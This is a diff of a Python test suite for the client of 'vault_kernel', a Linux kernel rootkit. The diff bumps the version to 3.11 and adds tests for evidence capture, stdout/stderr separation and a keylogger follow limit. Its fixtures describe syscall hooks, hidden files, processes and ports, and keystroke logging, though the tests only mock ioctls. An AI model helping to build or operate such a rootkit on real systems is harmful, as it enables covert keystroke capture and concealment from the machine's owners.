@@ -35,7 +35,7 @@ vk = _load_client()
 # EXACT snprintf block of IOCTL_GET_STATS (src/ioctl.c) for a module
 # with all 7 hooks and one hidden file/pid/port each.
 STATS_REPORT = (
-    "module=vault_kernel version=3.10\n"
+    "module=vault_kernel version=3.11\n"
     "hooks_installed=7 hooks_planned=7\n"
     "module_hidden=0\n"
     "hidden_files=1 hidden_pids=1 hidden_ports=1\n"
@@ -60,7 +60,7 @@ class TestParseStatsReport(unittest.TestCase):
     def test_kernel_fixture(self):
         self.assertEqual(vk.parse_stats_report(STATS_REPORT), {
             "module": "vault_kernel",
-            "version": "3.10",
+            "version": "3.11",
             "hooks_installed": "7",
             "hooks_planned": "7",
             "module_hidden": "0",
@@ -74,9 +74,9 @@ class TestParseStatsReport(unittest.TestCase):
     def test_multiple_pairs_per_line(self):
         """v3.4/v3.5 regression: the line-based parser lost every pair
         after the first on each line."""
-        got = vk.parse_stats_report("module=vault_kernel version=3.10\n")
+        got = vk.parse_stats_report("module=vault_kernel version=3.11\n")
         self.assertEqual(got["module"], "vault_kernel")
-        self.assertEqual(got["version"], "3.10")
+        self.assertEqual(got["version"], "3.11")
 
     def test_empty_report(self):
         self.assertEqual(vk.parse_stats_report(""), {})
@@ -149,7 +149,7 @@ class TestStatsJsonEndToEnd(unittest.TestCase):
         parsed = json.loads(out.getvalue())
         self.assertEqual(parsed["schema"], 1)
         self.assertEqual(parsed["module"], "vault_kernel")
-        self.assertEqual(parsed["version"], "3.10")
+        self.assertEqual(parsed["version"], "3.11")
         self.assertEqual(parsed["hooks_installed"], 7)
         self.assertEqual(parsed["hooks_planned"], 7)
         self.assertEqual(parsed["module_hidden"], 0)
@@ -194,7 +194,7 @@ class TestDoctorJsonEndToEnd(unittest.TestCase):
         self.assertTrue(parsed["device_present"])
         self.assertTrue(parsed["device_open"])
         self.assertTrue(parsed["stats_responds"])
-        self.assertEqual(parsed["module_version"], "3.10")
+        self.assertEqual(parsed["module_version"], "3.11")
         self.assertTrue(parsed["version_match"])
         self.assertEqual(parsed["uptime_s"], 42)
         self.assertEqual(parsed["hooks_installed"], 7)
@@ -207,7 +207,7 @@ class TestDoctorJsonEndToEnd(unittest.TestCase):
 
     def test_doctor_json_version_mismatch_warns(self):
         parsed = self._run_doctor_json(
-            stats_report=STATS_REPORT.replace("version=3.10", "version=3.0"))
+            stats_report=STATS_REPORT.replace("version=3.11", "version=3.0"))
         self.assertFalse(parsed["version_match"])
         self.assertEqual(parsed["warnings"], 1)
 
@@ -232,7 +232,7 @@ class TestFormatWatchPanel(unittest.TestCase):
     Mirrors TestRenderWatchPanel in the Go client."""
 
     STATS = {
-        "module": "vault_kernel", "version": "3.10",
+        "module": "vault_kernel", "version": "3.11",
         "hooks_installed": "7", "hooks_planned": "7",
         "module_hidden": "0", "hidden_files": "1", "hidden_pids": "1",
         "hidden_ports": "1", "keylog_bytes": "0", "uptime_s": "42",
@@ -253,7 +253,7 @@ class TestFormatWatchPanel(unittest.TestCase):
                         got.index("hooks_planned"))
         # Column alignment: widest key ("hooks_installed", 15) pads the
         # rest; the format adds " : " so "version" gets 9 spaces.
-        self.assertIn("version         : 3.10", got)
+        self.assertIn("version         : 3.11", got)
         self.assertIn("pids : 1234, 567", got)
         self.assertIn("files: secret.txt, my dir/with space.txt", got)
         self.assertIn("ports: 8080", got)
@@ -390,7 +390,7 @@ class TestBuildCaptureBundle(unittest.TestCase):
     contractual order, stats numeric-and-sorted, keylog verbatim."""
 
     STATS_RAW = {
-        "module": "vault_kernel", "version": "3.10",
+        "module": "vault_kernel", "version": "3.11",
         "hooks_installed": "7", "hooks_planned": "7",
         "module_hidden": "0", "hidden_files": "1", "hidden_pids": "1",
         "hidden_ports": "1", "keylog_bytes": "7", "uptime_s": "42",
@@ -475,6 +475,178 @@ class TestCaptureEndToEnd(unittest.TestCase):
                 parsed = json.load(fh)
             self.assertEqual(parsed["schema"], 1)
             self.assertEqual(parsed["keylog"], "typed-by-user")
+
+
+class TestCaptureStdoutFlag(unittest.TestCase):
+    """v3.11: capture --stdout — file AND pure-JSON stdout; the summary
+    moves to stderr so `| jq` pipelines stay clean (Go parity)."""
+
+    def _client(self):
+        c = vk.VaultKernelClient()
+        c._open = lambda: None
+        c._close = lambda: None
+
+        def fake_ioctl(request, buf=None):
+            if buf is not None:
+                data = {vk.IOCTL_GET_STATS: STATS_REPORT,
+                        vk.IOCTL_LIST_HIDDEN: LIST_REPORT,
+                        vk.IOCTL_KEYLOG_READ: "typed-by-user"}.get(
+                            request, "").encode()
+                buf[:len(data)] = data
+            return True
+
+        c._ioctl = fake_ioctl
+        return c
+
+    def test_capture_stdout_with_file(self):
+        import os as _os
+        import tempfile
+        with tempfile.TemporaryDirectory() as tmp:
+            path = _os.path.join(tmp, "evidence.json")
+            out, err = io.StringIO(), io.StringIO()
+            with contextlib.redirect_stdout(out), \
+                    contextlib.redirect_stderr(err):
+                self._client().capture(out=path, to_stdout=True)
+            # stdout: pure JSON (jq-safe).
+            parsed = json.loads(out.getvalue())
+            self.assertEqual(parsed["schema"], 1)
+            self.assertEqual(parsed["keylog"], "typed-by-user")
+            # stderr: the one-line summary.
+            self.assertIn(f"[+] Evidence bundle written to {path}",
+                          err.getvalue())
+            # file written 0600 with the same document.
+            st = _os.stat(path)
+            self.assertEqual(st.st_mode & 0o777, 0o600)
+            with open(path, encoding="utf-8") as fh:
+                self.assertEqual(json.load(fh)["schema"], 1)
+
+    def test_capture_stdout_without_file_is_plain_json(self):
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), \
+                contextlib.redirect_stderr(err):
+            self._client().capture(to_stdout=True)
+        parsed = json.loads(out.getvalue())
+        self.assertEqual(parsed["schema"], 1)
+        self.assertEqual(err.getvalue(), "")
+
+    def test_capture_stdoutfile_grammar(self):
+        """The argparse surface accepts --stdout alone and with --out,
+        and --stdout is a boolean (no operand)."""
+        parser = argparse.ArgumentParser()
+        sub = parser.add_subparsers(dest="command")
+        sp = sub.add_parser("capture")
+        sp.add_argument("--out", default=None)
+        sp.add_argument("--stdout", action="store_true")
+        a = parser.parse_args(["capture", "--stdout"])
+        self.assertTrue(a.stdout)
+        self.assertIsNone(a.out)
+        a = parser.parse_args(["capture", "--out", "f.json", "--stdout"])
+        self.assertTrue(a.stdout)
+        self.assertEqual(a.out, "f.json")
+
+
+class TestRootWarningSurface(unittest.TestCase):
+    """v3.11: the non-root warning must NOT pollute the no-root
+    workflow.  Regression for the v3.10 defect: `status --json` as
+    non-root printed the warning to STDOUT, so `| jq` died parsing
+    "[!] Warning..." (the Go client warned on stderr and stayed
+    clean).  Runs the REAL CLI in a subprocess — the only way to pin
+    the stream separation end to end."""
+
+    def _run_cli(self, *argv):
+        import os
+        import subprocess
+        import sys
+        env = dict(os.environ)
+        env["PYTHONPATH"] = ""
+        return subprocess.run(
+            [sys.executable, str(CLIENT_PATH), *argv],
+            capture_output=True, text=True, env=env,
+            timeout=30)
+
+    def test_status_json_stdout_is_pure_json(self):
+        r = self._run_cli("status", "--json")
+        self.assertEqual(r.returncode, 0, r.stderr)
+        # This parse IS the regression: pre-v3.11 stdout started with
+        # "[!] Warning: not running as root..." when non-root.
+        doc = json.loads(r.stdout)
+        self.assertEqual(doc["schema"], 1)
+        self.assertFalse(doc["device_present"])
+
+    def test_status_json_stderr_is_empty(self):
+        r = self._run_cli("status", "--json")
+        self.assertEqual(r.stderr, "",
+                         "no-root status must not warn on stderr")
+
+    def test_no_root_required_set(self):
+        # Parity with the Go deviceRequired list.
+        self.assertEqual(
+            vk._NO_ROOT_REQUIRED,
+            {"status", "version", "help", "magic-encode"})
+
+
+class TestKeylogStopAfter(unittest.TestCase):
+    """v3.11: keylog --stop-after N — argparse surface and the
+    follow-only guard."""
+
+    def test_grammar_type(self):
+        parser = argparse.ArgumentParser()
+        sub = parser.add_subparsers(dest="command")
+        sp = sub.add_parser("keylog")
+        sp.add_argument("--stop-after", type=vk._stop_after_arg,
+                        default=None)
+        self.assertEqual(parser.parse_args(
+            ["keylog", "--stop-after", "5"]).stop_after, 5)
+        self.assertEqual(parser.parse_args(
+            ["keylog", "--stop-after", "1"]).stop_after, 1)
+        for bad in ("0", "-3", "abc"):
+            with self.assertRaises(SystemExit):
+                parser.parse_args(["keylog", "--stop-after", bad])
+
+    def test_requires_follow(self):
+        c = vk.VaultKernelClient()
+        with self.assertRaises(SystemExit) as ctx:
+            c.keylog_read(stop_after=5)
+        self.assertIn("--stop-after requires --follow", str(ctx.exception))
+
+    def test_loop_stops_after_n_events(self):
+        """The follow loop ends after N emitted events with the SAME
+        farewell as the signals, and the sink stays consistent."""
+        import tempfile
+        payloads = ["aaa", "aaabbb", "aaabbbccc", "aaabbbcccddd"]
+
+        def fake_ioctl(request, buf=None):
+            if request == vk.IOCTL_KEYLOG_READ and buf is not None:
+                idx = min(fake_ioctl.calls, len(payloads) - 1)
+                data = payloads[idx].encode()
+                buf[:len(data)] = data
+                fake_ioctl.calls += 1
+            return True
+        fake_ioctl.calls = 0
+
+        c = vk.VaultKernelClient()
+        c._open = lambda: None
+        c._close = lambda: None
+        c._ioctl = fake_ioctl
+        with tempfile.TemporaryDirectory() as tmp:
+            import os as _os
+            path = _os.path.join(tmp, "cap.log")
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                # 50 ms -> seconds conversion is irrelevant here: the
+                # loop breaks on the 2nd event before ever sleeping out
+                # of a second poll.
+                c.keylog_read(follow=True, interval=0.0001,
+                              output=path, stop_after=2)
+            text = out.getvalue()
+            self.assertIn("[*] Follow stopped", text)
+            # Events 1 and 2 emitted ("aaa", then "bbb" diff), no more.
+            self.assertIn("aaa", text)
+            self.assertIn("bbb", text)
+            self.assertNotIn("ccc", text)
+            with open(path, encoding="utf-8") as fh:
+                self.assertIn("bbb", fh.read())
+                self.assertNotIn("ccc", fh.read())
 
 
 class TestKeylogOutput(unittest.TestCase):
@@ -622,13 +794,13 @@ class TestFormatWatchPanelPrev(unittest.TestCase):
     classic panel unchanged."""
 
     PREV = {
-        "module": "vault_kernel", "version": "3.10",
+        "module": "vault_kernel", "version": "3.11",
         "hooks_installed": "7", "hooks_planned": "7",
         "module_hidden": "0", "hidden_files": "1", "hidden_pids": "1",
         "hidden_ports": "1", "keylog_bytes": "0", "uptime_s": "42",
     }
     CUR = {
-        "module": "vault_kernel", "version": "3.10",
+        "module": "vault_kernel", "version": "3.11",
         "hooks_installed": "7", "hooks_planned": "7",
         "module_hidden": "0", "hidden_files": "2", "hidden_pids": "1",
         "hidden_ports": "1", "keylog_bytes": "11", "uptime_s": "43",
@@ -670,7 +842,7 @@ class TestParseModinfo(unittest.TestCase):
 
     FULL = ("filename:       /lib/modules/6.1.0/vault_kernel.ko\n"
             "srcversion:     ABC123\n"
-            "version:        3.10\n"
+            "version:        3.11\n"
             "author:         ruby570bocadito\n"
             "description:    vault_kernel kernel rootkit\n"
             "license:        GPL\n")
@@ -679,23 +851,23 @@ class TestParseModinfo(unittest.TestCase):
         got = vk.parse_modinfo(self.FULL)
         self.assertEqual(got, {
             "filename": "/lib/modules/6.1.0/vault_kernel.ko",
-            "version": "3.10",
+            "version": "3.11",
             "author": "ruby570bocadito",
             "description": "vault_kernel kernel rootkit",
         })
 
     def test_subset_and_empty(self):
-        got = vk.parse_modinfo("version:  3.10\nlicense: GPL\n")
-        self.assertEqual(got, {"version": "3.10"})
+        got = vk.parse_modinfo("version:  3.11\nlicense: GPL\n")
+        self.assertEqual(got, {"version": "3.11"})
         self.assertEqual(vk.parse_modinfo("license: GPL\nvermagic: x\n"),
                          {})
         self.assertEqual(vk.parse_modinfo(""), {})
 
     def test_empty_value_skipped_first_occurrence_wins(self):
-        got = vk.parse_modinfo("version:\nversion: 3.10\n")
-        self.assertEqual(got, {"version": "3.10"})
-        got = vk.parse_modinfo("version: 3.10\nversion: 9.9\n")
-        self.assertEqual(got, {"version": "3.10"})
+        got = vk.parse_modinfo("version:\nversion: 3.11\n")
+        self.assertEqual(got, {"version": "3.11"})
+        got = vk.parse_modinfo("version: 3.11\nversion: 9.9\n")
+        self.assertEqual(got, {"version": "3.11"})
 
 
 class TestBuildStatusDocument(unittest.TestCase):
@@ -706,7 +878,7 @@ class TestBuildStatusDocument(unittest.TestCase):
 
     def test_full_document(self):
         got = vk.build_status_document(True, False, {
-            "filename": "/x/vault_kernel.ko", "version": "3.10",
+            "filename": "/x/vault_kernel.ko", "version": "3.11",
             "author": "ruby570bocadito",
             "description": "vault_kernel kernel rootkit"})
         self.assertEqual(list(got.keys()),
@@ -727,8 +899,8 @@ class TestBuildStatusDocument(unittest.TestCase):
         self.assertNotIn("modinfo", got)
 
     def test_partial_modinfo_keeps_order(self):
-        got = vk.build_status_document(True, True, {"version": "3.10"})
-        self.assertEqual(got["modinfo"], {"version": "3.10"})
+        got = vk.build_status_document(True, True, {"version": "3.11"})
+        self.assertEqual(got["modinfo"], {"version": "3.11"})
         self.assertEqual(list(got["modinfo"].keys()), ["version"])
 
 
@@ -738,7 +910,7 @@ class TestStatusEndToEnd(unittest.TestCase):
 
     MODINFO_OUT = ("filename:       /lib/modules/6.1.0/vault_kernel.ko\n"
                    "srcversion:     ABC123\n"
-                   "version:        3.10\n"
+                   "version:        3.11\n"
                    "author:         ruby570bocadito\n"
                    "description:    lab module\n"
                    "license:        GPL\n")
@@ -757,7 +929,7 @@ class TestStatusEndToEnd(unittest.TestCase):
         self.assertEqual(parsed["schema"], 1)
         self.assertTrue(parsed["device_present"])
         self.assertFalse(parsed["module_in_sysfs"])
-        self.assertEqual(parsed["modinfo"]["version"], "3.10")
+        self.assertEqual(parsed["modinfo"]["version"], "3.11")
         self.assertEqual(parsed["modinfo"]["author"], "ruby570bocadito")
         # srcversion/license never leak into the document.
         self.assertNotIn("srcversion", parsed["modinfo"])
@@ -766,7 +938,7 @@ class TestStatusEndToEnd(unittest.TestCase):
     def test_status_text_modinfo_lines(self):
         got = self._run_status(as_json=False)
         self.assertIn("[*] vault_kernel kernel module is LOADED", got)
-        self.assertIn("    version: 3.10", got)
+        self.assertIn("    version: 3.11", got)
         self.assertIn("    author: ruby570bocadito", got)
         self.assertIn("    description: lab module", got)
         # The exact-key parser no longer prints srcversion.
@@ -889,8 +1061,8 @@ class TestStatsJsonEmptyReport(unittest.TestCase):
         self.assertIn("(no stats returned)", got)
 
     def test_text_ok_still_prints_report(self):
-        got = self._run(as_json=False, payload="version=3.10\n")
-        self.assertIn("version=3.10", got)
+        got = self._run(as_json=False, payload="version=3.11\n")
+        self.assertIn("version=3.11", got)
 
 
 
